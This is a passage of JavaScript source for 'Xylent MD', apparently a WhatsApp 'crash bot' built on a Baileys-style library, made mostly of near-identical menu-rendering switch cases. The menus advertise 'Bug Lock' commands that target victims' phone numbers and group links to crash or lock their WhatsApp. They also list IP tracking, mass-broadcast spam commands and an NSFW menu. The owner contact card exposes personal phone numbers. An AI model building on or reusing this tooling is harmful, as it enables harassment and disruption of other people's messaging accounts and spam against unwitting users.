        { quoted: lol }
    );

    await xylent.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    await xylent.sendMessage(
        m.chat,
        {
            audio: fs.readFileSync("./image/musik1.mp3"),
            mimetype: "audio/mp4",
            ptt: false
        },
        { quoted: qkontak }
    );
}
break;

    case "ownermenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await xylent.sendMessage(m.chat, { react: { text: "🚀", key: m.key } });

    let teks = `\`「 𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲 」\``

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: teks
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: `[ ! ] 𝐎𝐥𝐚 \`${pushname}\` 時間 ${getGreeting(parseInt(nowJakarta.format('HH')))} 私はいつでもあなたを助ける準備ができているサスケボットワッツアップクラッシュです。
╭────────────────────
│─▢ \`「 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐁𝐨𝐭 」\`
│─▢  Name Bot : Xylent MD
│─▢  Version : 2.0.0
│─▢  Owner : Pinnxzy.t.me
│─▢  Channel : XylentOfficial.t.me
│─▢  Bot Mode : *${xylent.public ? "Public" : "Self"}*
│─▢  Your Status : *${isCreator ? "Creator 👑" : isPremium ? "Premium User 💎" : "User 😹"}*
│─▢  Runtime Panel : *${runtime(process.uptime())}*
│─▢  Type Script : Java Script
│─▢  Action : Bít.ly/PinzyDev
╰────────────────────

╭──⧼ Feature Owner ⧽──
│─▢ .addowner
│─▢ .delowner
│─▢ .addmurbug
│─▢ .delmurbug
│─▢ .self
│─▢ .public
│─▢ .restart
╰────────────────────   
                        
const Xylent = PinzyX7`
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            imageMessage: (
                                await prepareWAMessageMedia(
                                    { image: { url: "https://f.top4top.io/p_3788vut3d1.jpg" } },
                                    { upload: xylent.waUploadToServer }
                                )
                            ).imageMessage
                        }),
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363424874566521@newsletter',
                                newsletterName: 'Pinzy | Information Xylent',
                                serverMessageId: 145
                            }
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲",
                                    url: "https://t.me/Pinnxzy",
                                    copy_code: "const Xylent = PinzyX7",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5],
                                    list_title: "CLICK",
                                    button_title: "SHOW MD MENU"
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "SHOW MD MENU",
                                        sections: [{
                                            title: "List Menu",
                                            highlight_label: "Feature Xylent Top 🔥",
                                            rows: [
                                                { title: "「 All Menu 」", description: "Show All Feature Bot XYLENT EMPIRE", id: ".allmenu" },
                                                { title: "「 Bug Menu 」", description: "Show Bugs Feature Bot XYLENT EMPIRE", id: ".bugmenu" },
                                                { title: "「 Fun Menu 」", description: "Show Fun Feature Bot XYLENT EMPIRE", id: ".funmenu" },
                                                { title: "「 Cpanel Menu 」", description: "Show Cpanel Feature Bot XYLENT EMPIRE", id: ".cpanelmenu" },
                                                { title: "「 Nsfw Menu 」", description: "Show 18+ Feature Bot XYLENT EMPIRE!!", id: ".nsfwmenu" },
                                                { title: "「 Thanks To 」", description: "Show The Support Bot XYLENT EMPIRE", id: ".tqto" },
                                                { title: "「 Info Script 」", description: "Show Information Script Bot XYLENT EMPIRE", id: ".script" },
                                                { title: "「 Pinzy Informasi 」", description: "Show Information Developer Bot XYLENT EMPIRE", id: ".owner" }
                                            ]
                                        }]
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        },
        { quoted: lol }
    );

    await xylent.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    await xylent.sendMessage(
        m.chat,
        {
            audio: fs.readFileSync("./image/musik1.mp3"),
            mimetype: "audio/mp4",
            ptt: false
        },
        { quoted: qkontak }
    );
}
break;
    
    case "funmenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await xylent.sendMessage(m.chat, { react: { text: "☄️", key: m.key } });

    let teks = `\`「 𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲 」\``

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: teks
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: `[ ! ] 𝐎𝐥𝐚 \`${pushname}\` 時間 ${getGreeting(parseInt(nowJakarta.format('HH')))} 私はいつでもあなたを助ける準備ができているサスケボットワッツアップクラッシュです。
╭────────────────────
│─▢ \`「 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐁𝐨𝐭 」\`
│─▢  Name Bot : Xylent MD
│─▢  Version : 2.0.0
│─▢  Owner : Pinnxzy.t.me
│─▢  Channel : XylentOfficial.t.me
│─▢  Bot Mode : *${xylent.public ? "Public" : "Self"}*
│─▢  Your Status : *${isCreator ? "Creator 👑" : isPremium ? "Premium User 💎" : "User 😹"}*
│─▢  Runtime Panel : *${runtime(process.uptime())}*
│─▢  Type Script : Java Script
│─▢  Action : Bít.ly/PinzyDev
╰────────────────────

╭──⧼ Feature Fun ⧽──
│─▢ .xylent ( Ai )
│─▢ .promote
│─▢ .demote
│─▢ .open
│─▢ .close
│─▢ .kick
│─▢ .ht
│─▢ .tagall
│─▢ .rvo
│─▢ .cekkhodam
│─▢ .cekganteng
│─▢ .cekcantik
│─▢ .cekkontol
│─▢ .cekidgc
│─▢ .cekidch
│─▢ .stiker
│─▢ .tiktok
│─▢ .bocilwindah
│─▢ .brat
│─▢ .getcode
│─▢ .tourl
│─▢ .tomp3
│─▢ .bratanime
│─▢ .trackip
│─▢ .quotesgalau
│─▢ .quotesmotivasi
│─▢ .quotesbacot
│─▢ .quotesbucin
│─▢ .kisahnabi
│─▢ .qc
│─▢ .audiotourl
│─▢ .send1xlihat
│─▢ .swgrup
│─▢ .totalfitur
│─▢ .addcase
│─▢ .delcase
│─▢ .listcase
│─▢ .getcase
│─▢ .accall
│─▢ .jpm
│─▢ .jpmv2
│─▢ .jpmch
╰────────────────────                
                                        
const Xylent = PinzyX7`
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            imageMessage: (
                                await prepareWAMessageMedia(
                                    { image: { url: "https://f.top4top.io/p_3788vut3d1.jpg" } },
                                    { upload: xylent.waUploadToServer }
                                )
                            ).imageMessage
                        }),
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363424874566521@newsletter',
                                newsletterName: 'Pinzy | Information Xylent',
                                serverMessageId: 145
                            }
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲",
                                    url: "https://t.me/Pinnxzy",
                                    copy_code: "const Xylent = PinzyX7",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5],
                                    list_title: "CLICK",
                                    button_title: "SHOW MD MENU"
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "SHOW MD MENU",
                                        sections: [{
                                            title: "List Menu",
                                            highlight_label: "Feature Xylent Top 🔥",
                                            rows: [
                                                { title: "「 All Menu 」", description: "Show All Feature Bot XYLENT EMPIRE", id: ".allmenu" },
                                                { title: "「 Bug Menu 」", description: "Show Bugs Feature Bot XYLENT EMPIRE", id: ".bugmenu" },
                                                { title: "「 Owner Menu 」", description: "Show Owner Feature Bot XYLENT EMPIRE", id: ".ownermenu" },
                                                { title: "「 Cpanel Menu 」", description: "Show Cpanel Feature Bot XYLENT EMPIRE", id: ".cpanelmenu" },
                                                { title: "「 Nsfw Menu 」", description: "Show 18+ Feature Bot XYLENT EMPIRE!!", id: ".nsfwmenu" },
                                                { title: "「 Thanks To 」", description: "Show The Support Bot XYLENT EMPIRE", id: ".tqto" },
                                                { title: "「 Info Script 」", description: "Show Information Script Bot XYLENT EMPIRE", id: ".script" },
                                                { title: "「 Pinzy Informasi 」", description: "Show Information Developer Bot XYLENT EMPIRE", id: ".owner" }
                                            ]
                                        }]
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        },
        { quoted: lol }
    );

    await xylent.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    await xylent.sendMessage(
        m.chat,
        {
            audio: fs.readFileSync("./image/musik1.mp3"),
            mimetype: "audio/mp4",
            ptt: false
        },
        { quoted: qkontak }
    );
}
break;

case "cpanelmenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await xylent.sendMessage(m.chat, { react: { text: "✨", key: m.key } });

    let teks = `\`「 𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲 」\``

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: teks
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: `[ ! ] 𝐎𝐥𝐚 \`${pushname}\` 時間 ${getGreeting(parseInt(nowJakarta.format('HH')))} 私はいつでもあなたを助ける準備ができているサスケボットワッツアップクラッシュです。
╭────────────────────
│─▢ \`「 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐁𝐨𝐭 」\`
│─▢  Name Bot : Xylent MD
│─▢  Version : 2.0.0
│─▢  Owner : Pinnxzy.t.me
│─▢  Channel : XylentOfficial.t.me
│─▢  Bot Mode : *${xylent.public ? "Public" : "Self"}*
│─▢  Your Status : *${isCreator ? "Creator 👑" : isPremium ? "Premium User 💎" : "User 😹"}*
│─▢  Runtime Panel : *${runtime(process.uptime())}*
│─▢  Type Script : Java Script
│─▢  Action : Bít.ly/PinzyDev
╰────────────────────

╭──⧼ Feature Cpanel ⧽──
│─▢ .1gb *username*
│─▢ .2gb *username*
│─▢ .3gb *username*
│─▢ .4gb *username*
│─▢ .5gb *username*
│─▢ .6gb *username*
│─▢ .7gb *username*
│─▢ .8gb *username*
│─▢ .9gb *username*
│─▢ .10gb *username*
│─▢ .unli *username*
│─▢ .cadmin *username*
│─▢ .delpanel
│─▢ .deladmin
│─▢ .listpanel
│─▢ .listadmin
│─▢ .addres
│─▢ .delres
╰──────────────────── 
                                                 
const Xylent = PinzyX7`
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            imageMessage: (
                                await prepareWAMessageMedia(
                                    { image: { url: "https://f.top4top.io/p_3788vut3d1.jpg" } },
                                    { upload: xylent.waUploadToServer }
                                )
                            ).imageMessage
                        }),
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363424874566521@newsletter',
                                newsletterName: 'Pinzy | Information Xylent',
                                serverMessageId: 145
                            }
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲",
                                    url: "https://t.me/Pinnxzy",
                                    copy_code: "const Xylent = PinzyX7",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5],
                                    list_title: "CLICK",
                                    button_title: "SHOW MD MENU"
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "SHOW MD MENU",
                                        sections: [{
                                            title: "List Menu",
                                            highlight_label: "Feature Xylent Top 🔥",
                                            rows: [
                                                { title: "「 All Menu 」", description: "Show All Feature Bot XYLENT EMPIRE", id: ".allmenu" },
                                                { title: "「 Bug Menu 」", description: "Show Bugs Feature Bot XYLENT EMPIRE", id: ".bugmenu" },
                                                { title: "「 Owner Menu 」", description: "Show Owner Feature Bot XYLENT EMPIRE", id: ".ownermenu" },
                                                { title: "「 Fun Menu 」", description: "Show Fun Feature Bot XYLENT EMPIRE", id: ".funmenu" },
                                                { title: "「 Nsfw Menu 」", description: "Show 18+ Feature Bot XYLENT EMPIRE!!", id: ".nsfwmenu" },
                                                { title: "「 Thanks To 」", description: "Show The Support Bot XYLENT EMPIRE", id: ".tqto" },
                                                { title: "「 Info Script 」", description: "Show Information Script Bot XYLENT EMPIRE", id: ".script" },
                                                { title: "「 Pinzy Informasi 」", description: "Show Information Developer Bot XYLENT EMPIRE", id: ".owner" }
                                            ]
                                        }]
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        },
        { quoted: lol }
    );

    await xylent.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    await xylent.sendMessage(
        m.chat,
        {
            audio: fs.readFileSync("./image/musik1.mp3"),
            mimetype: "audio/mp4",
            ptt: false
        },
        { quoted: qkontak }
    );
}
break;

    case "nsfwmenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await xylent.sendMessage(m.chat, { react: { text: "🔞", key: m.key } });

    let teks = `\`「 𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲 」\``

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: teks
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: `[ ! ] 𝐎𝐥𝐚 \`${pushname}\` 時間 ${getGreeting(parseInt(nowJakarta.format('HH')))} 私はいつでもあなたを助ける準備ができているサスケボットワッツアップクラッシュです。
╭────────────────────
│─▢ \`「 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐁𝐨𝐭 」\`
│─▢  Name Bot : Xylent MD
│─▢  Version : 2.0.0
│─▢  Owner : Pinnxzy.t.me
│─▢  Channel : XylentOfficial.t.me
│─▢  Bot Mode : *${xylent.public ? "Public" : "Self"}*
│─▢  Your Status : *${isCreator ? "Creator 👑" : isPremium ? "Premium User 💎" : "User 😹"}*
│─▢  Runtime Panel : *${runtime(process.uptime())}*
│─▢  Type Script : Java Script
│─▢  Action : Bít.ly/PinzyDev
╰────────────────────

╭──⧼ Feature Nafw ⧽──
│─▢ .18+
│─▢ .asupan
│─▢ .paptt
╰────────────────────

const Xylent = PinzyX7`
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            imageMessage: (
                                await prepareWAMessageMedia(
                                    { image: { url: "https://f.top4top.io/p_3788vut3d1.jpg" } },
                                    { upload: xylent.waUploadToServer }
                                )
                            ).imageMessage
                        }),
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363424874566521@newsletter',
                                newsletterName: 'Pinzy | Information Xylent',
                                serverMessageId: 145
                            }
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲",
                                    url: "https://t.me/Pinnxzy",
                                    copy_code: "const Xylent = PinzyX7",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5],
                                    list_title: "CLICK",
                                    button_title: "SHOW MD MENU"
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "SHOW MD MENU",
                                        sections: [{
                                            title: "List Menu",
                                            highlight_label: "Feature Xylent Top 🔥",
                                            rows: [
                                                { title: "「 All Menu 」", description: "Show All Feature Bot XYLENT EMPIRE", id: ".allmenu" },
                                                { title: "「 Bug Menu 」", description: "Show Bugs Feature Bot XYLENT EMPIRE", id: ".bugmenu" },
                                                { title: "「 Owner Menu 」", description: "Show Owner Feature Bot XYLENT EMPIRE", id: ".ownermenu" },
                                                { title: "「 Fun Menu 」", description: "Show Fun Feature Bot XYLENT EMPIRE", id: ".funmenu" },
                                                { title: "「 Cpanel Menu 」", description: "Show Cpanel Feature Bot XYLENT EMPIRE", id: ".cpanelmenu" },
                                                { title: "「 Thanks To 」", description: "Show The Support Bot XYLENT EMPIRE", id: ".tqto" },
                                                { title: "「 Info Script 」", description: "Show Information Script Bot XYLENT EMPIRE", id: ".script" },
                                                { title: "「 Pinzy Informasi 」", description: "Show Information Developer Bot XYLENT EMPIRE", id: ".owner" }
                                            ]
                                        }]
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        },
        { quoted: lol }
    );

    await xylent.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    await xylent.sendMessage(
        m.chat,
        {
            audio: fs.readFileSync("./image/musik1.mp3"),
            mimetype: "audio/mp4",
            ptt: false
        },
        { quoted: qkontak }
    );
}
break;

    case "allmenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await xylent.sendMessage(m.chat, { react: { text: "💥", key: m.key } });

    let teks = `\`「 𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲 」\``

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: teks
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: `[ ! ] 𝐎𝐥𝐚 \`${pushname}\` 時間 ${getGreeting(parseInt(nowJakarta.format('HH')))} 私はいつでもあなたを助ける準備ができているサスケボットワッツアップクラッシュです。
╭────────────────────
│─▢ \`「 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐁𝐨𝐭 」\`
│─▢  Name Bot : Xylent MD
│─▢  Version : 2.0.0
│─▢  Owner : Pinnxzy.t.me
│─▢  Channel : XylentOfficial.t.me
│─▢  Bot Mode : *${xylent.public ? "Public" : "Self"}*
│─▢  Your Status : *${isCreator ? "Creator 👑" : isPremium ? "Premium User 💎" : "User 😹"}*
│─▢  Runtime Panel : *${runtime(process.uptime())}*
│─▢  Type Script : Java Script
│─▢  Action : Bít.ly/PinzyDev
╰────────────────────

╭──⧼ Bug Lock WhatsApp ⧽──
│─▢ .galaxy 628xxx
│─▢ .glict 628xxx
│─▢ .glory 628xxx
│─▢ .imortal 628xxx 
│─▢ .crios 628xxx
╰────────────────────────

╭──⧼ Bug Lock Group WhatsApp ⧽──
│─▢ .X7gb *Link Group*
│─▢ .neo *Link Group*
╰────────────────────────

╭──⧼ Tes Function WhatsApp ⧽──
│─▢ .testfunc *628xxx*
│─▢ .testgb *ID Group*
╰────────────────────────

╭──⧼ Feature Owner ⧽──
│─▢ .addowner
│─▢ .delowner
│─▢ .addmurbug
│─▢ .delmurbug
│─▢ .self
│─▢ .public
│─▢ .restart
╰────────────────────────

╭──⧼ Feature Fun ⧽──
│─▢ .xylent ( Ai )
│─▢ .promote
│─▢ .demote
│─▢ .open
│─▢ .close
│─▢ .kick
│─▢ .ht
│─▢ .tagall
│─▢ .rvo
│─▢ .cekkhodam
│─▢ .cekganteng
│─▢ .cekcantik
│─▢ .cekkontol
│─▢ .cekidgc
│─▢ .cekidch
│─▢ .stiker
│─▢ .tiktok
│─▢ .bocilwindah
│─▢ .brat
│─▢ .getcode
│─▢ .tourl
│─▢ .tomp3
│─▢ .bratanime
│─▢ .trackip
│─▢ .quotesgalau
│─▢ .quotesmotivasi
│─▢ .quotesbacot
│─▢ .quotesbucin
│─▢ .kisahnabi
│─▢ .qc
│─▢ .audiotourl
│─▢ .send1xlihat
│─▢ .swgrup
│─▢ .totalfitur
│─▢ .addcase
│─▢ .delcase
│─▢ .listcase
│─▢ .getcase
│─▢ .accall
│─▢ .jpm
│─▢ .jpmv2
│─▢ .jpmch
╰────────────────────────

╭──⧼ Feature Cpanel ⧽──
│─▢ .1gb *username*
│─▢ .2gb *username*
│─▢ .3gb *username*
│─▢ .4gb *username*
│─▢ .5gb *username*
│─▢ .6gb *username*
│─▢ .7gb *username*
│─▢ .8gb *username*
│─▢ .9gb *username*
│─▢ .10gb *username*
│─▢ .unli *username*
│─▢ .cadmin *username*
│─▢ .delpanel
│─▢ .deladmin
│─▢ .listpanel
│─▢ .listadmin
│─▢ .addres
│─▢ .delres
╰────────────────────────

╭──⧼ Feature Nafw ⧽──
│─▢ .18+
│─▢ .asupan
│─▢ .paptt
╰──────────────────────── 
                         
const Xylent = PinzyX7`
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            imageMessage: (
                                await prepareWAMessageMedia(
                                    { image: { url: "https://f.top4top.io/p_3788vut3d1.jpg" } },
                                    { upload: xylent.waUploadToServer }
                                )
                            ).imageMessage
                        }),
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363424874566521@newsletter',
                                newsletterName: 'Pinzy | Information Xylent',
                                serverMessageId: 145
                            }
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲",
                                    url: "https://t.me/Pinnxzy",
                                    copy_code: "const Xylent = PinzyX7",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5],
                                    list_title: "CLICK",
                                    button_title: "SHOW MD MENU"
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "SHOW MD MENU",
                                        sections: [{
                                            title: "List Menu",
                                            highlight_label: "Feature Xylent Top 🔥",
                                            rows: [
                                                { title: "「 Bug Menu 」", description: "Show Bugs Feature Bot XYLENT EMPIRE", id: ".bugmenu" },
                                                { title: "「 Owner Menu 」", description: "Show Owner Feature Bot XYLENT EMPIRE", id: ".ownermenu" },
                                                { title: "「 Fun Menu 」", description: "Show Fun Feature Bot XYLENT EMPIRE", id: ".funmenu" },
                                                { title: "「 Cpanel Menu 」", description: "Show Cpanel Feature Bot XYLENT EMPIRE", id: ".cpanelmenu" },
                                                { title: "「 Nsfw Menu 」", description: "Show 18+ Feature Bot XYLENT EMPIRE!!", id: ".nsfwmenu" },
                                                { title: "「 Thanks To 」", description: "Show The Support Bot XYLENT EMPIRE", id: ".tqto" },
                                                { title: "「 Info Script 」", description: "Show Information Script Bot XYLENT EMPIRE", id: ".script" },
                                                { title: "「 Pinzy Informasi 」", description: "Show Information Developer Bot XYLENT EMPIRE", id: ".owner" }
                                            ]
                                        }]
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        },
        { quoted: lol }
    );

    await xylent.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    await xylent.sendMessage(
        m.chat,
        {
            audio: fs.readFileSync("./image/musik1.mp3"),
            mimetype: "audio/mp4",
            ptt: false
        },
        { quoted: qkontak }
    );
}
break;

case "tqto": {
await xylent.sendMessage(m.chat, { react: { text: "🔥", key: m.key } });
let teks = `\`一玄『 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 』\`
Allah ☇ My Good 
Pinzy ☇ Developer Xylent Empire
Araa ☇ My Bubub Pinzy
Xyzen ☇ Developer Ke 2 Xylent Empire
Taaqz ☇ King Band Sosmed
AsepX7 ☇ Developer Sasuke Crash
Badzzne ☇ Developer Null Strik
Nexi ☇ Developer Salvador
Ersstore  ☇ Developer Crashser ersstore
Yanz ☇ Best Friends
Saka ☇ Best Friends
`

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: teks
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "const Xylent = PinzyX7"
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            imageMessage: (
                                await prepareWAMessageMedia(
                                    { image: { url: "https://f.top4top.io/p_3788vut3d1.jpg" } },
                                    { upload: xylent.waUploadToServer }
                                )
                            ).imageMessage
                        }),
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363424874566521@newsletter',
                                newsletterName: 'Pinzy | Information Xylent',
                                serverMessageId: 145
                            }
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲",
                                    url: "https://t.me/Pinnxzy",
                                    copy_code: "const Xylent = PinzyX7",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5],
                                    list_title: "CLICK",
                                    button_title: "SHOW MD MENU"
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "SHOW MD MENU",
                                        sections: [{
                                            title: "List Menu",
                                            highlight_label: "Feature Xylent Top 🔥",
                                            rows: [
                                                { title: "「 All Menu 」", description: "Show All Feature Bot XYLENT EMPIRE", id: ".allmenu" },
                                                { title: "「 Bug Menu 」", description: "Show Bugs Feature Bot XYLENT EMPIRE", id: ".bugmenu" },
                                                { title: "「 Owner Menu 」", description: "Show Owner Feature Bot XYLENT EMPIRE", id: ".ownermenu" },
                                                { title: "「 Fun Menu 」", description: "Show Fun Feature Bot XYLENT EMPIRE", id: ".funmenu" },
                                                { title: "「 Cpanel Menu 」", description: "Show Cpanel Feature Bot XYLENT EMPIRE", id: ".cpanelmenu" },
                                                { title: "「 Nsfw Menu 」", description: "Show 18+ Feature Bot XYLENT EMPIRE", id: ".nsfwmenu" },
                                                { title: "「 Info Script 」", description: "Show Information Script Bot XYLENT EMPIRE", id: ".script" },
                                                { title: "「 Pinzy Informasi 」", description: "Show Information Developer Bot XYLENT EMPIRE", id: ".owner" }
                                            ]
                                        }]
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        },
        { quoted: lol }
    );

    await xylent.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    await xylent.sendMessage(
        m.chat,
        {
            audio: fs.readFileSync("./image/musik1.mp3"),
            mimetype: "audio/mp4",
            ptt: false
        },
        { quoted: qkontak }
    );
}
break;

case "owner": {
await xylent.sendMessage(m.chat, { react: { text: "💫",key: m.key,}}); 
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./image/Empire.jpg") }, { upload: xylent.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: ``,
}), 
contextInfo: {}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `\`[ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 ]\`
*WhatsApp Pinzy* : 6285183387097
*WhatsApp Xyzen* : 6287898109399
*Official Channel* : t.me/XylentOfficial`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Channel WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Channel Telegram\",\"url\":\"https://wa.me/XylentOfficial\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Telegram Developer\",\"url\":\"https://t.me/Pinnxzy\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Information Xylent\",\"url\":\"https://whatsapp.com/channel/0029Vb82CCx9sBI5CeFqNY2T\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
name: "cta_url",
